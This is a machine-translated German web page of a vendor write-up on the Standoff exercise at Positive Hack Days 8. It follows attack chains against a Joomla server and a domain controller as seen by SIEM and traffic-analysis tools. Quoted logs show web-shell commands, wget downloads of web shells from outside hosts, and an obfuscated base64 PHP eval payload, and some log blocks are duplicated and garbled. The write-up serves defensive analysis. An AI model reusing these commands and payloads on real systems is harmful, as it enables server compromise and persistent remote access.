<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>#‚É£ üîØ üôèüèø Konfrontation bei Positive Hack Days 8: Parsen von Angriffsketten üöí üë®üèø‚Äçü§ù‚Äçüë®üèº ü§∏üèø</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Die n√§chste ‚ÄûKonfrontation‚Äú endete also an den Positive Hack Days 8. Dieses Mal nahmen mehr als hundert Menschen am Kampf teil: 12 Angreiferteams, 8 V...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Konfrontation bei Positive Hack Days 8: Parsen von Angriffsketten</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/pt/blog/418335/"> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><img src="https://habrastorage.org/webt/lv/ma/od/lvmaodafe3q0xv0wflk--q_xae4.png"></a> <br><br>  Die n√§chste ‚ÄûKonfrontation‚Äú endete also an den Positive Hack Days 8. Dieses Mal nahmen mehr als hundert Menschen am Kampf teil: 12 Angreiferteams, 8 Verteidigungsteams und eine ganze Stadt, die sie angreifen und verteidigen mussten. <a name="habracut"></a><br><br>  Dieses Mal war The Standoff nicht nur von Angreifern und Verteidigern besucht, die drei Produkte unseres Unternehmens beobachteten alles, was im Spielnetzwerk passierte: <br><br><ul><li>  <b><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">MaxPatrol SIEM</a></b> - SIEM-System. </li><li>  <b><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">PT Network Attack Discovery</a></b> ist eine Netzwerksicherheitsl√∂sung zur Analyse des Netzwerkverkehrs, zur Identifizierung und Untersuchung von Vorf√§llen. </li><li>  <b><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">PT MultiScanner</a></b> ist ein mehrstufiges System zum Erkennen und Blockieren sch√§dlicher Inhalte. </li></ul><br>  Die drei Produkte wurden vom Team des Sicherheitsexpertenzentrums von Positive Technologies (PT ESC) √ºberwacht, das Spieltrends und Ereignisse √ºberwacht, um die Besucher des Expertenzentrums dar√ºber zu informieren. <br><br>  Dies war die erste derartige Teilnahme eines Teams von Experten und Produkten, und sie zeigten ihre beste Seite: Es gab so viele Daten, die f√ºr einen umfangreichen Bericht ausreichen w√ºrden.  Die Netzwerke von B√ºro Nr. 2 der SPUTNIK-Integratorfirma und B√ºro Nr. 1 der BeHealthy-Versicherungsgesellschaft erwiesen sich nach Beschreibung als die interessantesten und vollst√§ndigsten.  B√ºro Nr. 2 war insofern interessant, als es unter der Aufsicht des SOC RTK stand, aber nicht von einem Team von Verteidigern betreut wurde und von den angreifenden Teams vollst√§ndig gehackt wurde. <br><br>  Ich m√∂chte Sie daran erinnern, dass die Stadt neben zwei B√ºros ein W√§rmekraftwerk und ein Umspannwerk, eine Eisenbahn, Smart Homes mit Energier√ºckgewinnung und Banken mit Geldautomaten hatte. <br><br><img src="https://habrastorage.org/webt/ki/99/iq/ki99iqb0x5sdfk5d_am3faotusu.png"><br><br>  <i>Gaming-Infrastruktur</i> <br><br>  Wie die Ereignisse in den B√ºros Nr. 1 und Nr. 2 durch das Prisma von MaxPatrol SIEM, PT NAD und PT MultiScanner mit Schwerpunkt auf den technischen Details des Hackens aussahen, wird sp√§ter erl√§utert. <br><br>  Logikdiagramm eines Gaming-Netzwerkb√ºros Nr. 2: <br><br><img src="https://habrastorage.org/webt/m4/fw/um/m4fwumpq3cljrqs-6r1qjh5kp5q.png"><br><br>  Die Adresse der angreifenden Teams lautet 172.31.x.0 / 24, wobei x die Befehlsnummer von 1 bis 8 ist. Tats√§chlich gab es insgesamt 12 Teams, jedoch aufgrund der Architektur der Netzwerkinfrastruktur des Netzwerks (der Netzwerkkern wurde in Cisco CSR1000v emuliert) und der physischen Ausstattung war es m√∂glich, nur 8 physische Netzwerkschnittstellen zu organisieren, die f√ºr Teams im gesamten Spielbereich gewechselt wurden.  Daher wurden in vier Netzwerken zwei Teams lokalisiert. <br><br>  In der Infrastruktur von Office 2 wurden vier Netzwerksegmente zugewiesen: <br><br><ul><li>  DMZ (100.64.154.0/25); </li><li>  Server (10.106.60.0/24); </li><li>  Mitarbeiter des Unternehmens (10.106.50.0/24); </li><li>  Verteidiger-Team (10.106.82.0/24). </li></ul><br>  Die in der entmilitarisierten Zone befindlichen Knoten waren f√ºr alle Angreifer √ºber das Netzwerk zug√§nglich.  Beim Zugriff auf diese Knoten stammten die tats√§chlichen Netzwerkadressen der NAT-Befehle aus dem Pool 100.110.255.0/24. F√ºr die Verteidiger war es daher nicht einfach herauszufinden, wem dieser oder jener Netzwerkverkehr geh√∂rt - es k√∂nnte sich um eines von 12 angreifenden Teams oder einen legitimen Skriptpr√ºfer handeln. √úberpr√ºfen der Wartungsfreundlichkeit von Diensten aus demselben Adresspool wie die Angreifer. <br><br>  Um unsere Produkte mit Ereignissen √ºber das Geschehen in der Spieleinfrastruktur zu f√ºllen, haben wir das Entfernen und Umleiten einer Kopie des gesamten Netzwerkverkehrs in PT NAD organisiert sowie eine erweiterte Pr√ºfung der Ereignisse der Zielsysteme eingerichtet und deren Bereitstellung an MaxPatrol SIEM organisiert. <br><br>  Die Analyse von Angriffen mit Schwerpunkt auf Teams finden Sie in unserem anderen <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Bericht √ºber Habr</a> . <br><br><h2>  Joomla (100.64.154.147) </h2><br>  Einer der Server in DMZ Office Nr. 2 war ein Server mit Joomla CMS.  Einige Stunden nach Spielbeginn zeigten sich in PT NAD die ersten Anzeichen f√ºr einen Kompromiss dieses Servers - das Ausf√ºllen der Webshell aus dem Pool der ‚Äûgrauen‚Äú IP-Adressen: <br><br><img src="https://habrastorage.org/webt/pj/jq/fr/pjjqfrt_2jdv_fwplypyzlmhwcg.png"><br><br>  Wie bereits erw√§hnt, wurden alle Subnetze angreifender Teams auf demselben ME (Attacker-FW) beendet. Beim Herstellen einer Verbindung zu den angegriffenen Objekten wurden die IP-Adressen der Angreifer aus einem einzigen Pool in graue IP-Adressen √ºbersetzt (100.110.255.0/24).  Daher wurde zur Personifizierung von Angriffen durch Befehle ein Schema mit der Anreicherung von Gateways gem√§√ü der NAT-Tabelle dieser ME implementiert.  Im Rahmen von MP SIEM war die Anreicherung wie folgt: <br><br><img src="https://habrastorage.org/webt/bk/4d/7s/bk4d7szltcyuzoywpodadcszg3c.png"><br><br>  Mit diesem Ansatz konnten wir feststellen, dass dieser Angriff von Team 1 initiiert wurde.  Aufgrund der Verwendung desselben Adresspools durch verschiedene Teams k√∂nnen wir den Namen des Teams auf Anfrage eines bestimmten Netzwerks nicht zuverl√§ssig bestimmen, und zum Zwecke der weiteren Erl√§uterung werden wir die Teams anhand ihrer Netzwerknummern benennen. <br><br>  Eine Stunde nach dem Versuch, Befehl Nr. 1 auszuf√ºhren, bemerkte PT NAD, dass Befehl Nr. 8 mit dem sprechenden Namen SHE __ auf eine andere Web-Shell geladen wurde Der Befehl legt eine SSH-Sitzung von einem nicht privilegierten Benutzer fest. <br><br><img src="https://habrastorage.org/webt/xp/zp/6h/xpzp6hvlbykhamirlmbhoxm2lm0.png"><br><br><img src="https://habrastorage.org/webt/bd/cc/mx/bdccmxlsasdvx5avlabnoxqgm44.png"><br><br>  Das Passwort f√ºr dieses Konto befand sich oben im Rockyou-W√∂rterbuch und wurde abgeglichen.  Der Zugriff auf das Root-Konto f√ºr das 8. Team erfolgte aufgrund der Mitgliedschaft des Benutzers in der Gruppe mit dem Recht auf kennwortfreie Ausf√ºhrungsbefehle vom Root aus erst gegen 16:00 Uhr.  Davon k√∂nnen wir in den MP SIEM-Protokollen √ºberzeugt werden, die uns √ºber die erste Anmeldung als Benutzer und dann √ºber die Eskalation von Berechtigungen mit dem Befehl sudo informieren. <br><br><img src="https://habrastorage.org/webt/s4/jz/2m/s4jz2m3zuf1mirhsdhjrdfu9ug8.png"><br><img src="https://habrastorage.org/webt/nl/wq/la/nlwqlabrbzuu3vnjrtzbuo0qaro.png"><br><br>  Die Protokollzeit kann aufgrund der Konfiguration des Spielservers um 3 Stunden variieren. <br><br>  Am Abend des ersten Tages der Konfrontation nahm die sechste Mannschaft Joomla in Besitz.  NAD entdeckte die Ausnutzung einer Sicherheitsanf√§lligkeit bzw. eines <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Features,</a> √ºber das das Team die weithin bekannte WSO-Web-Shell hochlud und begann, mit ihr zu interagieren. <br><br><img src="https://habrastorage.org/webt/ts/il/um/tsilumlbi-mfrbehbf8vo1dcjfo.png"><br><br><pre><code class="hljs powershell"><span class="hljs-number"><span class="hljs-number">100.110</span></span>.<span class="hljs-number"><span class="hljs-number">255.160</span></span> - - [<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">09</span></span>:<span class="hljs-number"><span class="hljs-number">39</span></span>:<span class="hljs-number"><span class="hljs-number">31</span></span> -<span class="hljs-number"><span class="hljs-number">0700</span></span>] GET /templates/beez3/index.php HTTP <span class="hljs-number"><span class="hljs-number">100.110</span></span>.<span class="hljs-number"><span class="hljs-number">255.160</span></span> - - [<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">09</span></span>:<span class="hljs-number"><span class="hljs-number">39</span></span>:<span class="hljs-number"><span class="hljs-number">35</span></span> -<span class="hljs-number"><span class="hljs-number">0700</span></span>] POST /templates/beez3/index.php HTTP <span class="hljs-number"><span class="hljs-number">100.110</span></span>.<span class="hljs-number"><span class="hljs-number">255.160</span></span> - - [<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">09</span></span>:<span class="hljs-number"><span class="hljs-number">39</span></span>:<span class="hljs-number"><span class="hljs-number">35</span></span> -<span class="hljs-number"><span class="hljs-number">0700</span></span>] GET /templates/beez3/index.php HTTP <span class="hljs-number"><span class="hljs-number">100.110</span></span>.<span class="hljs-number"><span class="hljs-number">255.220</span></span> - - [<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">09</span></span>:<span class="hljs-number"><span class="hljs-number">39</span></span>:<span class="hljs-number"><span class="hljs-number">56</span></span> -<span class="hljs-number"><span class="hljs-number">0700</span></span>] POST /templates/beez3/index.php HTTP ‚Ä¶ <span class="hljs-number"><span class="hljs-number">100.110</span></span>.<span class="hljs-number"><span class="hljs-number">255.32</span></span> - - [<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">09</span></span>:<span class="hljs-number"><span class="hljs-number">44</span></span>:<span class="hljs-number"><span class="hljs-number">39</span></span> -<span class="hljs-number"><span class="hljs-number">0700</span></span>] POST /templates/beez3/index.php HTTP <span class="hljs-number"><span class="hljs-number">100.110</span></span>.<span class="hljs-number"><span class="hljs-number">255.118</span></span> - - [<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">09</span></span>:<span class="hljs-number"><span class="hljs-number">44</span></span>:<span class="hljs-number"><span class="hljs-number">43</span></span> -<span class="hljs-number"><span class="hljs-number">0700</span></span>] POST /templates/beez3/index.php HTTP <span class="hljs-number"><span class="hljs-number">100.110</span></span>.<span class="hljs-number"><span class="hljs-number">255.145</span></span> - - [<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">09</span></span>:<span class="hljs-number"><span class="hljs-number">44</span></span>:<span class="hljs-number"><span class="hljs-number">49</span></span> -<span class="hljs-number"><span class="hljs-number">0700</span></span>] GET /templates/beez3/index.php HTTP</code> </pre> <br>  Es ist erw√§hnenswert, dass das Skript, mit dem die Befehle die Shells f√ºllten, <br>  erfordert ein Administratorkonto, dessen Kennwort mithilfe einer anderen <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Sicherheitsanf√§lligkeit</a> CVE-2017-14596 im Authentifizierungsmechanismus in Joomla √ºber LDAP ausgew√§hlt wurde: Durch √Ñndern der Authentifizierungs-LDAP-Anforderung k√∂nnen Angreifer die Anmeldung und das Kennwort schnell vom Administratorkonto abrufen. <br><br>  Und nach einer halben Stunde √ºbernahmen sie die Kontrolle √ºber das gesamte System. <br><br><img src="https://habrastorage.org/webt/0f/mb/kh/0fmbkhezemjgbqpk33mmdrypg70.png"><br><br>  Die angreifenden Teams nutzten die erbeutete Maschine zur weiteren Aufkl√§rung im Netzwerk des zweiten SPUTNIK-B√ºros mit den Dienstprogrammen nmap und hping3.  Wir k√∂nnen uns anhand der MP SIEM-Daten ein Bild von ihren Aktionen machen: <br><br><img src="https://habrastorage.org/webt/tb/o2/lz/tbo2lzwokr5rloy_7ykz8klyywg.png"><br><img src="https://habrastorage.org/webt/vn/nr/o4/vnnro4qzj6jwsw8snzzpmfpu8gy.png"><br><br>  Beispiel DMZ Intelligence Office Network 2 (100.64.154.0/24) und das Defender Team Network (10.106.82.0/24): <br><br><img src="https://habrastorage.org/webt/ne/bu/dr/nebudriyumef2zbdsigm2ncyqqm.png"><br><img src="https://habrastorage.org/webt/tv/6u/ay/tv6uaynn7krj_ls6snexal-nu3g.png"><br><br>  Um 21:17 Uhr stellten wir fest, dass der OpenVPN-Client auf dem Joomla-Server installiert und gestartet wurde.  Die Verbindung wurde mit dem Server 195.16.61.229 in Moskau hergestellt.  Wenig sp√§ter stellten wir fest, dass diese Aktionen von Mitgliedern von Team Nr. 6 durchgef√ºhrt wurden und das Team somit zus√§tzliche Computer- und Personalressourcen an einem entfernten Standort gewinnen konnte. <br><br>  Alle Interaktionen mit dem entfernten Standort wurden innerhalb des gesch√ºtzten Tunnels durchgef√ºhrt, so dass es unm√∂glich ist, die Art dieser Interaktion und den Grad ihres Einflusses auf das Spiel festzustellen.  Wir k√∂nnen nur indirekte Schlussfolgerungen ziehen, basierend auf der Anzahl der VPN-Sitzungen und der Menge der √ºbertragenen Daten. <br><br><img src="https://habrastorage.org/webt/iw/ce/c4/iwcec4-s1rj715wnjapvtqgivza.png"><br><br>  Das Interessanteste ist jedoch, dass das Team die Spuren nicht bereinigt hat. Nach dem Spiel haben wir auf dem ovpn-Server eine Konfiguration gefunden, die die Root- und pers√∂nlichen Zertifikate, den privaten Schl√ºssel und die pers√∂nlichen Daten des Schl√ºsselbesitzers enth√§lt.  Wenn Sie eine Suchmaschine verwenden, ist es √ºberhaupt nicht schwierig, die tats√§chliche Identit√§t des Eigent√ºmers unter dem Spitznamen phonexicum zu bestimmen.  Die vollst√§ndige Karte mit allen VPN-Verbindungen w√§hrend des Spiels finden Sie am Ende des Artikels. <br><br>  Andere interessante Ereignisse begannen sich nach Mitternacht zu entwickeln (+3 Stunden zu den Protokollen). <br>  Shell /id.php Befehl # 4 findet Befehl # 1: <br><br><pre> <code class="hljs powershell">[<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">21</span></span>:<span class="hljs-number"><span class="hljs-number">58</span></span>:<span class="hljs-number"><span class="hljs-number">22</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] <span class="hljs-string"><span class="hljs-string">"GET /id.php HTTP/1.1 [15/May/2018:21:58:24 +0000] "</span></span>GET /id.php HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> [<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">21</span></span>:<span class="hljs-number"><span class="hljs-number">58</span></span>:<span class="hljs-number"><span class="hljs-number">34</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] <span class="hljs-string"><span class="hljs-string">"GET /id.php?c=ls HTTP/1.1 [15/May/2018:21:58:38 +0000] "</span></span>GET /id.php?cmd=ls HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> [<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">21</span></span>:<span class="hljs-number"><span class="hljs-number">59</span></span>:<span class="hljs-number"><span class="hljs-number">53</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] <span class="hljs-string"><span class="hljs-string">"GET /id.php?cmd=id HTTP/1.1 [15/May/2018:21:59:56 +0000] "</span></span>GET /id.php?cmd=ls+<span class="hljs-literal"><span class="hljs-literal">-la</span></span> HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span></code> </pre> <br><img src="https://habrastorage.org/webt/bb/1j/z7/bb1jz7fidnpbep9o-lxcqmdwoou.png"><br><img src="https://habrastorage.org/webt/4u/or/jj/4uorjjrsmjk1kzlautfduvh8gtq.png"><br><br>  Und wird sofort im System gest√§rkt, wobei die WSO-Web-Shell unter dem Namen 123.php erhalten bleibt <br><br><pre> <code class="hljs powershell">[<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">22</span></span>:<span class="hljs-number"><span class="hljs-number">00</span></span>:<span class="hljs-number"><span class="hljs-number">05</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] <span class="hljs-string"><span class="hljs-string">"GET /id.php?cmd=wget HTTP/1.1 [15/May/2018:22:00:10 +0000] "</span></span>GET /id.php?cmd=wget <span class="hljs-literal"><span class="hljs-literal">-h</span></span> HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> [<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">22</span></span>:<span class="hljs-number"><span class="hljs-number">00</span></span>:<span class="hljs-number"><span class="hljs-number">53</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] <span class="hljs-string"><span class="hljs-string">"GET /id.php?cmd=cat index.php HTTP/1.1 [15/May/2018:22:01:04 +0000] "</span></span>GET /id.php?cmd=wget http://txt.<span class="hljs-number"><span class="hljs-number">731</span></span>my.com/wso.txt <span class="hljs-literal"><span class="hljs-literal">-o</span></span> <span class="hljs-number"><span class="hljs-number">123</span></span>.php HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span></code> </pre> <br><img src="https://habrastorage.org/webt/uu/yf/sb/uuyfsboyntyyavtzwwh4diilju8.png"><br><img src="https://habrastorage.org/webt/1i/rb/7f/1irb7fdixxk8cdoblvtn7hkldlm.png"><br><br>  Das erste Team, das gehostet wurde, bis Team Nr. 4 dies einige Stunden sp√§ter entdeckte, benannte die id.php-Shell nach einer kurzen Diskussion in 021371b392f0b42398630fd668adff5d.php um <br><br><pre> <code class="hljs powershell">[<span class="hljs-number"><span class="hljs-number">16</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">00</span></span>:<span class="hljs-number"><span class="hljs-number">06</span></span>:<span class="hljs-number"><span class="hljs-number">13</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] <span class="hljs-string"><span class="hljs-string">"GET /id.php?cmd=id HTTP/1.1 [16/May/2018:00:06:26 +0000] "</span></span>GET /id.php?cmd=ls HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> [<span class="hljs-number"><span class="hljs-number">16</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">00</span></span>:<span class="hljs-number"><span class="hljs-number">07</span></span>:<span class="hljs-number"><span class="hljs-number">16</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] <span class="hljs-string"><span class="hljs-string">"GET /id.php?cmd=mv id.php 021371b392f0b42398630fd668adff5d.php HTTP/1.1</span></span></code> </pre><br>  Anschlie√üend wurde 021371b392f0b42398630fd668adff5d.php durch kekekeke.php und kekpek.php ersetzt <br><br><pre> <code class="hljs powershell">[<span class="hljs-number"><span class="hljs-number">16</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">00</span></span>:<span class="hljs-number"><span class="hljs-number">41</span></span>:<span class="hljs-number"><span class="hljs-number">23</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] GET /<span class="hljs-number"><span class="hljs-number">021371</span></span>b392f0b42398630fd668adff5d.php?cmd=echo <span class="hljs-string"><span class="hljs-string">"&lt;?phpeval(base64_decode(ailYmWoCX2oBXg8FSJdSxwQkAgAd3UiJ5moQWmoxWA8FWWoyWA8FSJZqK1gPBVBWX2oJWJm2EEiJ1k0xyWoiQVqyBw8FSJZIl18PBf.chr(47).m));?&gt;"</span></span> &gt; kekekeke.php HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> [<span class="hljs-number"><span class="hljs-number">16</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">06</span></span>:<span class="hljs-number"><span class="hljs-number">20</span></span>:<span class="hljs-number"><span class="hljs-number">52</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] GET /<span class="hljs-number"><span class="hljs-number">021371</span></span>b392f0b42398630fd668adff5d.php?cmd=wget%<span class="hljs-number"><span class="hljs-number">20193.124</span></span>.<span class="hljs-number"><span class="hljs-number">190.162</span></span>/kek.php <span class="hljs-literal"><span class="hljs-literal">-O</span></span> kekpek.php HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span></code> (base64_decode (ailYmWoCX2oBXg8FSJdSxwQkAgAd3UiJ5moQWmoxWA8FWWoyWA8FSJZqK1gPBVBWX2oJWJm2EEiJ1k0xyWoiQVqyBw8FSJZIl18PBf.chr ( <code class="hljs powershell">[<span class="hljs-number"><span class="hljs-number">16</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">00</span></span>:<span class="hljs-number"><span class="hljs-number">41</span></span>:<span class="hljs-number"><span class="hljs-number">23</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] GET /<span class="hljs-number"><span class="hljs-number">021371</span></span>b392f0b42398630fd668adff5d.php?cmd=echo <span class="hljs-string"><span class="hljs-string">"&lt;?phpeval(base64_decode(ailYmWoCX2oBXg8FSJdSxwQkAgAd3UiJ5moQWmoxWA8FWWoyWA8FSJZqK1gPBVBWX2oJWJm2EEiJ1k0xyWoiQVqyBw8FSJZIl18PBf.chr(47).m));?&gt;"</span></span> &gt; kekekeke.php HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> [<span class="hljs-number"><span class="hljs-number">16</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">06</span></span>:<span class="hljs-number"><span class="hljs-number">20</span></span>:<span class="hljs-number"><span class="hljs-number">52</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] GET /<span class="hljs-number"><span class="hljs-number">021371</span></span>b392f0b42398630fd668adff5d.php?cmd=wget%<span class="hljs-number"><span class="hljs-number">20193.124</span></span>.<span class="hljs-number"><span class="hljs-number">190.162</span></span>/kek.php <span class="hljs-literal"><span class="hljs-literal">-O</span></span> kekpek.php HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span></code> &gt; Kekekeke.php HTTP <code class="hljs powershell">[<span class="hljs-number"><span class="hljs-number">16</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">00</span></span>:<span class="hljs-number"><span class="hljs-number">41</span></span>:<span class="hljs-number"><span class="hljs-number">23</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] GET /<span class="hljs-number"><span class="hljs-number">021371</span></span>b392f0b42398630fd668adff5d.php?cmd=echo <span class="hljs-string"><span class="hljs-string">"&lt;?phpeval(base64_decode(ailYmWoCX2oBXg8FSJdSxwQkAgAd3UiJ5moQWmoxWA8FWWoyWA8FSJZqK1gPBVBWX2oJWJm2EEiJ1k0xyWoiQVqyBw8FSJZIl18PBf.chr(47).m));?&gt;"</span></span> &gt; kekekeke.php HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> [<span class="hljs-number"><span class="hljs-number">16</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">06</span></span>:<span class="hljs-number"><span class="hljs-number">20</span></span>:<span class="hljs-number"><span class="hljs-number">52</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] GET /<span class="hljs-number"><span class="hljs-number">021371</span></span>b392f0b42398630fd668adff5d.php?cmd=wget%<span class="hljs-number"><span class="hljs-number">20193.124</span></span>.<span class="hljs-number"><span class="hljs-number">190.162</span></span>/kek.php <span class="hljs-literal"><span class="hljs-literal">-O</span></span> kekpek.php HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span></code> </pre> <br><img src="https://habrastorage.org/webt/rx/ei/zf/rxeizfxenzfe2cxwf1xuuc8bwzk.png"><br><br>  Die folgenden Ereignisse in der Dom√§neninfrastruktur von B√ºro Nr. 2 SPUTNIK stehen in engem Zusammenhang mit dem, was auf Jumla geschieht. <br><br><h2>  SPUTNIK (10.106.60.0/24) </h2><br>  Nachdem Joomla durchbohrt worden war, erhielt der Angreifer Zugriff auf die internen Segmente der SPUTNIK-Infrastruktur (B√ºro Nr. 2).  Ohne nachzudenken, fliegt der MS17-010-Exploit zum Dom√§nencontroller WIN2008R2-DC.domain2.phd (10.106.60.10). <br><br><img src="https://habrastorage.org/webt/ok/iw/xo/okiwxohg5xsajx_kpbq3muhbwss.png"><br><br>  Es ist bequemer, die Chronologie weiterer Ereignisse durch die Ausl√∂ser von MP SIEM zu beobachten: <br><br><img src="https://habrastorage.org/webt/pe/b3/dc/peb3dct4qumtok5vppa_awaxxgg.png"><br><img src="https://habrastorage.org/webt/ad/vn/ul/advnuld4auuorgtjbnxb3h3itxy.png"><br><br>  Der erste Schritt des Angreifers bestand darin, einen Benutzer mit dem Namen "Benutzername" und dem Passwort "1qazzaq!" Zu erstellen.  und Hinzuf√ºgen zur Gruppe der lokalen Administratoren (Bildschirm 2).  Die erfolgreiche Ausnutzung von Exploits von MS17-010 erm√∂glicht den Zugriff mit NT-Authority \ System-Berechtigungen. In 